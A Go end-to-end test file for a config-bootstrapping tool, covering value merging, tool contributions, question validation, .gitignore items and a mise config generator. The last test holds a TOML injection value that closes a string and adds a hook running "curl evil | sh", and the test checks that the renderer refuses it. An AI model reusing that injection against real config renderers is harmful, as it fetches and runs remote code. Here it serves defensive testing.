package migrate

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/virajp/bootstrap/e2e/internal/harness"
	rc "github.com/virajp/bootstrap/e2e/internal/repocase"
)

// valueTemplate writes the template of the tool <tool>: its values and the
// values of all tools, and a current file of the consumer.
func valueTemplate(c *rc.Case, tool string) {
	writeLines(c, c.ClonePath("repo/tools/"+tool+"/"+tool+".txt.tmpl"),
		tool+" config=<% .config | data.ToJSON %>", tool+" all=<% .all | data.ToJSON %>")
	writeLines(c, c.Path(tool+".txt"), "x")
}

// valueTool writes a new tool with the template, and <lines> at the end of
// its tools.toml.
func valueTool(c *rc.Case, tool string, lines ...string) {
	writeLines(c, c.ClonePath("repo/tools/"+tool+"/tools.toml"),
		append([]string{`default_envs = [ "dev" ]`, `depends = []`, `root_only = false`}, lines...)...)
	valueTemplate(c, tool)
}

// valueList gives a tool of the clone the template and a default list.
func valueList(c *rc.Case, tool string) {
	appendLines(c, c.ClonePath("repo/tools/"+tool+"/tools.toml"), "", "[defaults]", `items = [ "a" ]`)
	valueTemplate(c, tool)
}

// needsVdep makes the tool vtest depend on vdep.
func needsVdep(c *rc.Case) {
	p := c.ClonePath("repo/tools/vtest/tools.toml")
	s := regexp.MustCompile(`(?m)^depends = \[\]$`).ReplaceAllString(harness.ReadFile(p), `depends = [ "vdep" ]`)
	harness.WriteFile(c.T, p, s)
}

func valuesDefaults(c *rc.Case) { valueTool(c, "vtest", "[defaults]", `key = "default"`) }

func valuesContribution(c *rc.Case) {
	valueTool(c, "vtest", "[defaults]", `items = [ "a" ]`, `key = "default"`)
	valueTool(c, "vother", "[contributes.vtest]", `items = [ "b" ]`, `key = "other"`)
}

func valuesConflict(c *rc.Case) {
	valuesContribution(c)
	valueTool(c, "vthird", "[contributes.vtest]", `key = "third"`)
}

func valuesUnknown(c *rc.Case) { valueTool(c, "vother", "[contributes.nope]", `key = "x"`) }

func valuesLinter(c *rc.Case) { valueList(c, "linter") }

func valuesVdep(c *rc.Case) {
	valueTool(c, "vtest")
	needsVdep(c)
	valueTool(c, "vdep", "[defaults]", `items = [ "a" ]`)
}

// valuesMiseVdep: the mise tool of vtest depends on vdep-x through the
// depends of its tool.
func valuesMiseVdep(c *rc.Case) {
	valueTool(c, "vtest", "[mise.tools.vtest-x]", `version = "latest"`)
	needsVdep(c)
	valueTool(c, "vdep", "[defaults]", `items = [ "a" ]`, "[mise.tools.vdep-x]", `version = "latest"`)
}

func valuesReplace(c *rc.Case) {
	valueTool(c, "vtest", "[defaults]", `items = [ "a" ]`, "[defaults.t]", `a = "1"`, `b = "2"`)
}

// valueEmptyMember: the tool vtest with a default list, and a {} member of
// the pack <pack>.
func valueEmptyMember(pack string) func(c *rc.Case) {
	return func(c *rc.Case) {
		valueTool(c, "vtest", "[defaults]", `items = [ "a" ]`)
		p := c.ClonePath("repo/packs.toml")
		var b strings.Builder
		for _, l := range strings.Split(strings.TrimSuffix(harness.ReadFile(p), "\n"), "\n") {
			b.WriteString(l + "\n")
			if l == "[pack."+pack+"]" {
				b.WriteString("vtest = {}\n")
			}
		}
		harness.WriteFile(c.T, p, b.String())
	}
}

func valuesQuestionNone(c *rc.Case) { valueTool(c, "vtest", "[questions.q]", `example = "x"`) }
func valuesQuestionKey(c *rc.Case) {
	valueTool(c, "vtest", "[questions.q]", `foo = "x"`, `question = "Which?"`)
}
func valuesQuestionDetect(c *rc.Case) {
	valueTool(c, "vtest", "[questions.q]", `detect = 1`, `question = "Which?"`)
}
func valuesQuestionValid(c *rc.Case) {
	valueTool(c, "vtest", "[questions.q]", `detect = "echo x"`, `example = "x"`, `question = "Which?"`)
}

func valuesOther(c *rc.Case) {
	valuesDefaults(c)
	valueTool(c, "vother")
}

func valuesSecurity(c *rc.Case) {
	valueList(c, "gitleaks")
	valueList(c, "_security_base")
}

func valuesTwoErrors(c *rc.Case) {
	valueTool(c, "vtest", "[questions.q]", `foo = "x"`, `question = "Which?"`)
	valuesUnknown(c)
}

// allHas tells whether the `.all` line of <tool> has the fixed string <text>.
func allHas(c *rc.Case, tool, text string) bool {
	for _, l := range strings.Split(c.LogText(), "\n") {
		if strings.HasPrefix(l, "+"+tool+" all=") && strings.Contains(l, text) {
			return true
		}
	}
	return false
}

func checkNotSelected(c *rc.Case) {
	checkLogLacks(c, "a contribution to a tool that is not selected: no effect", `"vtest"`)
}

func checkAll(c *rc.Case) {
	c.CheckThat(".all: the values of another tool", allHas(c, "vother", `"vtest":{"key":"default"}`))
	c.CheckThat(".all: an empty table for a tool without values", allHas(c, "vtest", `"vother":{}`))
}

func checkSecurity(c *rc.Case) {
	c.CheckThat("the nested pack: _security_base through depends", c.LogHas(`+_security_base config={"items":["a","b"]}`))
}

func checkEngineKeysRefused(c *rc.Case) {
	c.CheckThat("[all] of repo.toml is not a key either", c.LogHas("[ERROR] all in "))
	c.CheckThat("[all] of repo.toml does not reach .all", c.LogLacks(`"leak"`))
}

func checkTwoValuesErrors(c *rc.Case) {
	c.CheckThat("two errors in two tools: the question", c.LogHas(
		"repo/tools/vtest/tools.toml: [questions.q] foo is not a key of a question - the keys are question, detect, example, group, note and optional"))
}

const (
	vtestValues = `environments = [ "dev" ]
[tools.vtest]`
	votherValues = vtestValues + `
[tools.vother]`
	msgUnknownContribution = "repo/tools/vother/tools.toml: [contributes.nope] names a tool that bootstrap does not have"
)

func TestValues(t *testing.T) {
	rc.Run(t, rc.Spec{Name: "values: [defaults] only", Values: vtestValues, Change: valuesDefaults,
		Message: `+vtest config={"key":"default"}`})
	rc.Run(t, rc.Spec{Name: "values: [tools.vtest] wins over [defaults], and env is not a value", Values: vtestValues + `
env = [ "dev" ]
key = "x"`, Change: valuesDefaults, Message: `+vtest config={"key":"x"}`})
	rc.Run(t, rc.Spec{Name: "values: a contribution adds a list item, and its scalar wins over the default", Values: votherValues,
		Change: valuesContribution, Message: `+vtest config={"items":["a","b"],"key":"other"}`})
	rc.Run(t, rc.Spec{Name: "values: [tools.vtest] wins over a contribution", Values: `environments = [ "dev" ]
[tools.vother]
[tools.vtest]
key = "mine"`, Change: valuesContribution, Message: `+vtest config={"items":["a","b"],"key":"mine"}`})
	rc.Run(t, rc.Spec{Name: "values: two tools contribute different scalars", Code: 2, Values: votherValues + `
[tools.vthird]`, Change: valuesConflict,
		Message: "repo/tools/vother/tools.toml and repo/tools/vthird/tools.toml set [contributes.vtest] key to different values - remove one"})
	rc.Run(t, rc.Spec{Name: "values: a contribution to a tool that is not selected", Values: `environments = [ "dev" ]
[tools.vother]`, Change: valuesContribution, Message: `+vother config={}`, Check: checkNotSelected})
	rc.Run(t, rc.Spec{Name: "values: a contribution to a tool that bootstrap does not have", Code: 3, Values: `environments = [ "dev" ]
[tools.vother]`, Change: valuesUnknown, Message: msgUnknownContribution})
	rc.Run(t, rc.Spec{Name: "values: a base tool, a list appends", Values: `environments = [ "dev" ]
[tools.linter]
items = [ "b" ]`, Change: valuesLinter, Message: `+linter config={"items":["a","b"]}`})
	rc.Run(t, rc.Spec{Name: "values: a base tool, a scalar over a list", Code: 2, Values: `environments = [ "dev" ]
[tools.linter]
items = "b"`, Change: valuesLinter, Message: "sets items to a string, but it is a list in the base or dependency tool linter"})
	rc.Run(t, rc.Spec{Name: "values: a dependency tool, a list appends", Values: vtestValues + `
[tools.vdep]
items = [ "b" ]`, Change: valuesVdep, Message: `+vdep config={"items":["a","b"]}`})
	rc.Run(t, rc.Spec{Name: "values: a dependency tool, a scalar over a list", Code: 2, Values: vtestValues + `
[tools.vdep]
items = "b"`, Change: valuesVdep, Message: "sets items to a string, but it is a list in the base or dependency tool vdep"})
	rc.Run(t, rc.Spec{Name: "values: a tool of a mise depends, a list appends", Values: vtestValues + `
[tools.vdep]
items = [ "b" ]`, Change: valuesMiseVdep, Message: `+vdep config={"items":["a","b"]}`})
	rc.Run(t, rc.Spec{Name: "values: another tool, a list appends and a table merges", Values: vtestValues + `
items = [ "b" ]
[tools.vtest.t]
b = "3"`, Change: valuesReplace, Message: `+vtest config={"items":["a","b"],"t":{"a":"1","b":"3"}}`})
	rc.Run(t, rc.Spec{Name: "values: a {} member of pack base, a list appends", Values: vtestValues + `
items = [ "b" ]`, Change: valueEmptyMember("base"), Message: `+vtest config={"items":["a","b"]}`})
	rc.Run(t, rc.Spec{Name: "values: a {} member of a nested default pack, a list appends", Values: vtestValues + `
items = [ "b" ]`, Change: valueEmptyMember("security"), Message: `+vtest config={"items":["a","b"]}`})
	rc.Run(t, rc.Spec{Name: "questions: no question", Code: 2, Values: vtestValues, Change: valuesQuestionNone,
		Message: "repo/tools/vtest/tools.toml: [questions.q] needs a question string"})
	rc.Run(t, rc.Spec{Name: "questions: the key foo", Code: 2, Values: vtestValues, Change: valuesQuestionKey,
		Message: "repo/tools/vtest/tools.toml: [questions.q] foo is not a key of a question - the keys are question, detect, example, group, note and optional"})
	rc.Run(t, rc.Spec{Name: "questions: detect = 1", Code: 2, Values: vtestValues, Change: valuesQuestionDetect,
		Message: "repo/tools/vtest/tools.toml: [questions.q] detect must be a string (a shell command)"})
	rc.Run(t, rc.Spec{Name: "questions: a valid question with its answer", Values: vtestValues + `
q = "y"`, Change: valuesQuestionValid})
	rc.Run(t, rc.Spec{Name: "questions: a valid question without an answer", Code: 2, Values: vtestValues,
		Change: valuesQuestionValid, Message: "the question vtest.q has no answer in"})
	rc.Run(t, rc.Spec{Name: "values: .all holds the values of another selected tool", Values: votherValues,
		Change: valuesOther, Message: `+vtest config={"key":"default"}`, Check: checkAll})
	rc.Run(t, rc.Spec{Name: "values: config and all of repo.toml are not keys, so they cannot replace the engine keys", Code: 2,
		Values: `environments = [ "dev" ]
config = "mine"
[all]
leak = "mine"
[tools.vtest]`, Change: valuesDefaults, Message: "[ERROR] config in ", Check: checkEngineKeysRefused})
	rc.Run(t, rc.Spec{Name: "values: [packs.security] with format = 2 is the old form", Code: 2, OldValues: true,
		Values: devValues + `
[packs.security]
env = [ "dev" ]`, Message: ".config/bootstrap.toml is the old form of the values of the repository - run bootstrap migrate"})
	rc.Run(t, rc.Spec{Name: "values: [packs.security] in repo.toml is not a key", Code: 2, Values: devValues + `
[packs.security]
env = [ "dev" ]`, Message: ".config/bootstrap/repo.toml is not a key of repo.toml"})
	rc.Run(t, rc.Spec{Name: "values: [tools.node] with a key that the tool does not have", Code: 2, Values: devValues + `
[tools.node]
version = "1"`, Message: "[tools.node].version in "})
	rc.Run(t, rc.Spec{Name: "values: [overrides.tools.vtest] wins over [tools.vtest]", Values: vtestValues + `
key = "x"
[overrides.tools.vtest]
key = "y"`, Change: valuesDefaults, Message: `+vtest config={"key":"y"}`})
	rc.Run(t, rc.Spec{Name: "values: tools of the nested pack and of its depends, a list appends", Values: devValues + `
[tools.gitleaks]
items = [ "b" ]
[tools._security_base]
items = [ "b" ]`, Change: valuesSecurity, Message: `+gitleaks config={"items":["a","b"]}`, Check: checkSecurity})
	rc.Run(t, rc.Spec{Name: "values: two errors in two tools", Code: 3, Values: votherValues, Change: valuesTwoErrors,
		Message: msgUnknownContribution, Check: checkTwoValuesErrors})
}

// The vwf lines that virajp-plugins contributes to the .gitignore of git.
var vwfLines = []string{"docs/memory/handoff/", "docs/memory/doctor/", "docs/memory/runs/", "docs/scratchpad/", "!docs/plans/**/*.log"}

// gitignoreCount tells whether the .gitignore of the consumer has <n> lines
// <line>.
func gitignoreCount(c *rc.Case, line string, n int) bool {
	k := 0
	for _, l := range strings.Split(harness.ReadFile(c.Path(".gitignore")), "\n") {
		if l == line {
			k++
		}
	}
	return k == n
}

func checkVwfLinesOnce(c *rc.Case) {
	for _, line := range vwfLines {
		c.CheckThat("virajp-plugins: .gitignore has "+line+" once", gitignoreCount(c, line, 1))
	}
	gitLine, vwf := 0, 0
	for i, l := range strings.Split(harness.ReadFile(c.Path(".gitignore")), "\n") {
		if l == "*.log" {
			gitLine = i + 1
		}
		if l == vwfLines[0] {
			vwf = i + 1
		}
	}
	c.CheckThat("virajp-plugins: the vwf lines after the lines of git", gitLine > 0 && vwf > gitLine)
}

func checkVwfLinesNone(c *rc.Case) {
	for _, line := range vwfLines {
		c.CheckThat("no virajp-plugins: .gitignore lacks "+line, gitignoreCount(c, line, 0))
	}
	c.CheckThat("no virajp-plugins: .gitignore keeps *.log", gitignoreCount(c, "*.log", 1))
}

func checkVwfLineRemoved(c *rc.Case) {
	c.CheckThat("a vwf line with $mode = remove: docs/scratchpad/ is gone", gitignoreCount(c, "docs/scratchpad/", 0))
	c.CheckThat("a vwf line with $mode = remove: the other lines stay", gitignoreCount(c, "docs/memory/runs/", 1))
}

func TestContributedItems(t *testing.T) {
	rc.Run(t, rc.Spec{Name: "virajp-plugins: the vwf lines in .gitignore, once", Args: noArgs, Values: `environments = [ "dev" ]
[tools.virajp-plugins]`, Check: checkVwfLinesOnce})
	rc.Run(t, rc.Spec{Name: "no virajp-plugins: no vwf line in .gitignore", Args: noArgs, Values: devValues, Check: checkVwfLinesNone})
	rc.Run(t, rc.Spec{Name: "virajp-plugins: an override removes a vwf line", Args: noArgs, Values: `environments = [ "dev" ]
[tools.virajp-plugins]
[tools.git.files.".gitignore"]
"docs/scratchpad/" = { "$mode" = "remove" }`, Check: checkVwfLineRemoved})
	rc.Run(t, rc.Spec{Name: "an override of a vwf line without virajp-plugins is not unused", Values: `environments = [ "dev" ]
[tools.git.files.".gitignore"]
"docs/scratchpad/" = { "$mode" = "remove" }`, Message: "Dry run: "})
	rc.Run(t, rc.Spec{Name: "a submodule with [tools.virajp-plugins], a root_only tool", Code: 2, Values: `environments = [ "dev" ]
[tools.virajp-plugins]`, Change: consumerSubmodule, Message: "virajp-plugins is for the root repository only"})
	// A scratch tool that contributes an item to a target that git does not
	// declare as merge-mode, and one that contributes to a tool that
	// bootstrap does not have.
	rc.Check(t, rc.Spec{Name: "check: a contributed item for a target that is not merge-mode", Code: 2, Values: devValues,
		Change:  func(c *rc.Case) { valueTool(c, "vother", `[[contributes_items.git."nope.txt".item]]`, `value = "x"`) },
		Message: `[contributes_items.git."nope.txt"]: git declares no merge-mode file nope.txt`})
	rc.Check(t, rc.Spec{Name: "check: contributed items for a tool that bootstrap does not have", Code: 2, Values: devValues,
		Change: func(c *rc.Case) {
			valueTool(c, "vother", `[[contributes_items.nope.".gitignore".item]]`, `value = "x"`)
		},
		Message: "[contributes_items.nope] names a tool that bootstrap does not have"})
}

// confFile writes a generated mise file of the consumer, so a dry run shows
// its diff.
func confFile(c *rc.Case, tool, env string) {
	writeLines(c, c.Path(".config/mise/conf.d/"+tool+"/mise."+env+".toml"), "# x")
}

// mtestTool: mtest is a tool of the clone with only a tools.toml, and the
// consumer has its generated dev file.
func mtestTool(c *rc.Case, lines ...string) {
	writeLines(c, c.ClonePath("repo/tools/mtest/tools.toml"),
		append([]string{`default_envs = [ "dev" ]`, `depends = []`, `root_only = false`}, lines...)...)
	confFile(c, "mtest", "dev")
}

func mtestBootstrap(c *rc.Case) {
	mtestTool(c, "[mise.bootstrap.packages]", `brew = "a"`, "[mise.dotfiles]", `src = "b"`, "[mise.env]", `A = "1"`)
	confFile(c, "mtest", "ci")
}

func mtestRender(c *rc.Case) {
	mtestTool(c, "[defaults]", `x = "a"`, "[mise.env]", `X = "<% .config.x %>"`)
}

func mtestRequired(c *rc.Case) {
	mtestTool(c, "[mise.env]", "X = \"<% required `x is needed` .config.x %>\"")
}

func mtestHome(c *rc.Case) { mtestTool(c, "[mise.env]", `H = "<% .env.HOME %>"`) }

func mtestBadToml(c *rc.Case) {
	mtestTool(c, "[defaults]", `q = 'a"b'`, "[mise.env]", `X = "<% .config.q %>"`)
}

// mtestNew: a new file. A real run writes it, with no file of the consumer
// before it.
func mtestNew(c *rc.Case) {
	mtestRender(c)
	_ = os.Remove(c.Path(".config/mise/conf.d/mtest/mise.dev.toml"))
}

// mtestDiff gives the diff of the dry run for a generated file of mtest.
func mtestDiff(c *rc.Case, file string) string {
	head := "would update " + c.Consumer + "/.config/mise/conf.d/mtest/" + file
	var b strings.Builder
	on := false
	for _, l := range strings.Split(c.LogText(), "\n") {
		if strings.Contains(l, head) {
			on = true
			continue
		}
		if strings.HasPrefix(l, "bootstrap: ") {
			on = false
		}
		if on {
			b.WriteString(l + "\n")
		}
	}
	return strings.TrimRight(b.String(), "\n")
}

func checkMtestDevOnly(c *rc.Case) {
	name := "[mise.bootstrap.*], [mise.dotfiles]"
	dev, ci := mtestDiff(c, "mise.dev.toml"), mtestDiff(c, "mise.ci.toml")
	c.CheckThat(name+": the dev file has [bootstrap.packages]", strings.Contains(dev, "[bootstrap.packages]"))
	c.CheckThat(name+": the dev file has [dotfiles]", strings.Contains(dev, "[dotfiles]"))
	c.CheckThat(name+": the ci file has [env]", strings.Contains(ci, "+[env]"))
	c.CheckThat(name+": the ci file lacks bootstrap", !strings.Contains(ci, "[bootstrap"))
	c.CheckThat(name+": the ci file lacks dotfiles", !strings.Contains(ci, "[dotfiles"))
}

func checkMtestKept(c *rc.Case) {
	checkLogLacks(c, "a required value that is missing: the file stays",
		"would update "+c.Consumer+"/.config/mise/conf.d/mtest/mise.dev.toml")
}

func checkMtestNew(c *rc.Case) {
	file := c.Path(".config/mise/conf.d/mtest/mise.dev.toml")
	c.CheckThat("a tool without a template: the value is rendered", rc.FileHas(file, `X = "a"`))
	c.CheckThat("a tool without a template: no <% in the file", !rc.FileHas(file, "<%"))
}

// noTextBelow tells whether no file below <dir> has <text>. tools.toml
// holds the value, and .git is not a written file.
func noTextBelow(dir, text string) bool {
	found := false
	_ = filepath.WalkDir(dir, func(p string, e os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if e.IsDir() && e.Name() == ".git" {
			return filepath.SkipDir
		}
		if e.Type().IsRegular() && e.Name() != "tools.toml" && rc.FileHas(p, text) {
			found = true
		}
		return nil
	})
	return !found
}

func checkMtestNoHook(c *rc.Case) {
	name := "a value that adds a table"
	c.CheckThat(name+": no mise.dev.toml", rc.NoFile(c.Path(".config/mise/conf.d/mtest/mise.dev.toml")))
	c.CheckThat(name+": the hook is in no written file", noTextBelow(c.Consumer, "curl evil"))
}

const mtestValues = `environments = [ "dev" ]
[tools.mtest]`

func TestMiseGenerator(t *testing.T) {
	home := harness.GetEnv(harness.Env(), "HOME")
	rc.Run(t, rc.Spec{Name: "[mise.bootstrap.*] and [mise.dotfiles] are only in dev", Values: `environments = [ "dev", "ci" ]
[tools.mtest]
env = [ "dev", "ci" ]`, Change: mtestBootstrap, Message: "conf.d/mtest/mise.ci.toml", Check: checkMtestDevOnly})
	rc.Run(t, rc.Spec{Name: "<% %> in a tools.toml, the value of [defaults]", Values: mtestValues, Change: mtestRender, Message: `X = "a"`})
	rc.Run(t, rc.Spec{Name: "<% %> in a tools.toml, the value of [tools.mtest]", Values: mtestValues + `
x = "b"`, Change: mtestRender, Message: `X = "b"`})
	rc.Run(t, rc.Spec{Name: "<% %> in a tools.toml, a required value that is missing", Code: 2, Values: mtestValues,
		Change: mtestRequired, Message: "x is needed", Check: checkMtestKept})
	rc.Run(t, rc.Spec{Name: "[overrides.mise.env] over a <% %> value", Values: mtestValues + `
[overrides.mise.env]
X = "c"`, Change: mtestRender, Message: `X = "c" # override: .config/bootstrap/tools.toml`})
	rc.Run(t, rc.Spec{Name: "<% %> in a tools.toml, .env.HOME", Values: mtestValues, Change: mtestHome, Message: `H = "` + home + `"`})
	rc.Run(t, rc.Spec{Name: "<% %> in a tools.toml, a value that breaks the TOML", Code: 2, Values: mtestValues,
		Change: mtestBadToml, Message: "repo/tools/mtest/tools.toml: not valid TOML after render"})
	rc.Run(t, rc.Spec{Name: "<% %> in a tools.toml, a tool without a template", Args: noArgs, Values: mtestValues,
		Change: mtestNew, Check: checkMtestNew})
	// A value that closes its string to add a table of its own, here a hook.
	rc.Run(t, rc.Spec{Name: "<% %> in a tools.toml, a value that adds a table", Code: 2, Args: noArgs, Values: mtestValues + `
x = """a"
[mise.hooks]
enter = "curl evil | sh"
z = "z"""`, Change: mtestNew, Message: "repo/tools/mtest/tools.toml: a rendered value changes the keys of the file",
		Check: checkMtestNoHook})
}
